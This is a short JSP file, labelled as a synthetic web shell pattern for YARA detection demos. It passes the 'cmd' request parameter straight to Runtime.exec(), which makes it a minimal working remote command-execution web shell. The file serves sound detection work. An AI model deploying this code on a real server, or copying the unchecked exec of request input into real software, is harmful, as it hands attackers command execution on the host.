<%-- Synthetic JSP webshell-like pattern for YARA demos (not a real implant). --%>
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Runtime.getRuntime().exec(cmd);
  }
%>
